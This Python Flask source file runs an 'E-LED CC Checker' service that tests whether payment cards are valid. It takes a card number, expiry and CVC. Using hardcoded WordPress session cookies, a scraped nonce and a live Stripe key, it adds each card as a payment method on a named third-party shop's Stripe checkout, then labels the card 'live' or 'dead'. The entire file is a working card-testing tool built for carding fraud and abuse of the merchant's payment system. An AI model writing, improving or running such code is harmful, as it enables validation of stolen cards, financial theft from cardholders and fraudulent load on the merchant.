from flask import Flask, request, jsonify
import requests
import re
from datetime import datetime

app = Flask(__name__)

# DYNAMIC COOKIES WITH EXPIRY CHECK
def get_valid_cookies():
    # Tere original cookies with timestamp check
    COOKIES = {
        'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'uslfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cfcc7f214dd3ce843e5685de367f552785729f3c31f8f81dfd09734e768a60625',
        '_ga': 'GA1.1.1745993156.1761639993',
        # ... (tera original cookies yahi rahenge)
    }
    
    # Check if cookies are expired
    expiry_timestamp = 1762849683  # Example: Oct 29, 2025
    current_timestamp = int(datetime.now().timestamp())
    
    if current_timestamp > expiry_timestamp:
        return {"status": "cookie_expired", "msg": "Cookies expired, update needed"}
    
    return COOKIES

# DYNAMIC NONCE EXTRACTION
def extract_nonce():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
        }
        
        # Fetch the payment page to get fresh nonce
        response = requests.get('https://e-led.lv/my-account/add-payment-method/', headers=headers, cookies=get_valid_cookies())
        
        # Extract nonce from page source
        nonce_match = re.search(r'var wc_stripe_params = {[^}]*"nonce":"([^"]+)"', response.text)
        if nonce_match:
            return nonce_match.group(1)
        else:
            # Alternative pattern search
            nonce_match = re.search(r'"stripe_nonce":"([^"]+)"', response.text)
            return nonce_match.group(1) if nonce_match else None
    except Exception as e:
        return None

def luhn_valid(card):
    card = str(card).replace(' ', '').replace('-', '')
    if not card.isdigit() or len(card) < 13:
        return False
        
    digits = [int(d) for d in card]
    total = 0
    for i, digit in enumerate(reversed(digits)):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        
    return total % 10 == 0

def get_bin(cc):
    try:
        cc_clean = str(cc).replace(' ', '').replace('-', '')[:6]
        if len(cc_clean) != 6:
            return {"brand": "Invalid", "bank": "Invalid", "country": "Invalid"}
            
        r = requests.get(f"https://lookup.binlist.net/{cc_clean}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "brand": d.get("brand", "Unknown"),
                "type": d.get("type", "Unknown"),
                "bank": d.get("bank", {}).get("name", "Unknown"),
                "country": d.get("country", {}).get("name", "Unknown"),
                "scheme": d.get("scheme", "Unknown")
            }
    except:
        pass
    return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown"}

@app.route('/')
def home():
    return jsonify({"msg": "E-LED CC Checker Live! Use /cc=number|mm|yy|cvc"})

@app.route('/cc=<path:cc_data>')
def check_cc(cc_data):
    # Input validation
    parts = cc_data.split('|')
    if len(parts) != 4:
        return jsonify({"status": "error", "msg": "Use: number|mm|yy|cvc"}), 400

    cc, mm, yy, cvc = parts
    
    # Clean and validate CC
    cc_clean = str(cc).replace(' ', '').replace('-', '')
    if not cc_clean.isdigit() or len(cc_clean) < 13:
        return jsonify({"status": "dead", "msg": "Invalid CC Format", "cc": cc}), 200

    # Luhn check
    if not luhn_valid(cc_clean):
        return jsonify({"status": "dead", "msg": "Luhn Failed", "cc": cc}), 200

    # Get fresh nonce
    NONCE = extract_nonce()
    if not NONCE:
        return jsonify({"status": "error", "msg": "Failed to get security nonce"}), 500

    bin_info = get_bin(cc_clean)

    # FIXED Stripe data - no extra spaces
    data_stripe = f"type=card&card[number]={cc_clean}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=96327&client_attribution_metadata[client_session_id]=5947447b-74ec-42d1-aa64-f880939047c1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe357b77-6fc9-43f8-82f8-1d04cb6dd2ca&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=a5043f11-4679-4b52-962c-8747f54af89016e011&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20"

    # Stripe Headers
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    # Step 1: Stripe PM Create
    try:
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers_stripe, 
            data=data_stripe, 
            cookies=get_valid_cookies(), 
            timeout=10
        )
        
        if stripe_response.status_code == 200:
            stripe_data = stripe_response.json()
            pm_id = stripe_data.get('id', '')
            
            if not pm_id:
                return jsonify({
                    "status": "dead", 
                    "msg": "PM ID not generated", 
                    "cc": cc,
                    "bin_info": bin_info
                }), 200
                
        else:
            error_msg = stripe_response.json().get('error', {}).get('message', 'Stripe API Error')
            return jsonify({
                "status": "dead", 
                "msg": f"Stripe: {error_msg}", 
                "cc": cc,
                "bin_info": bin_info
            }), 200
            
    except Exception as e:
        return jsonify({"status": "error", "msg": f"Stripe Exception: {str(e)}"}), 500

    # Step 2: AJAX Confirm with DYNAMIC NONCE
    headers_ajax = {
        'authority': 'e-led.lv',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://e-led.lv',
        'referer': 'https://e-led.lv/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data_ajax = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': NONCE,  # NOW DYNAMIC
    }

    try:
        ajax_response = requests.post(
            'https://e-led.lv/wp-admin/admin-ajax.php', 
            cookies=get_valid_cookies(), 
            headers=headers_ajax, 
            data=data_ajax, 
            timeout=10
        )
        
        if ajax_response.status_code == 200:
            ajax_data = ajax_response.json()
            
            if ajax_data.get('result') == 'success':
                return jsonify({
                    "status": "live",
                    "msg": "Card Live! Payment Method Added",
                    "cc": cc_clean,
                    "last4": cc_clean[-4:],
                    "bin_info": bin_info
                })
            else:
                # Extract error message properly
                messages = ajax_data.get('messages', 'Declined')
                if isinstance(messages, str):
                    clean_msg = messages.replace('<div class="woocommerce-error">', '').replace('</div>', '').strip()
                else:
                    clean_msg = str(messages)
                    
                return jsonify({
                    "status": "dead",
                    "msg": clean_msg,
                    "cc": cc_clean,
                    "bin_info": bin_info
                })
        else:
            return jsonify({
                "status": "dead", 
                "msg": f"AJAX HTTP {ajax_response.status_code}", 
                "cc": cc_clean,
                "bin_info": bin_info
            }), 200
            
    except Exception as e:
        return jsonify({"status": "error", "msg": f"AJAX Exception: {str(e)}"}), 500

if __name__ == '__main__':
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False)
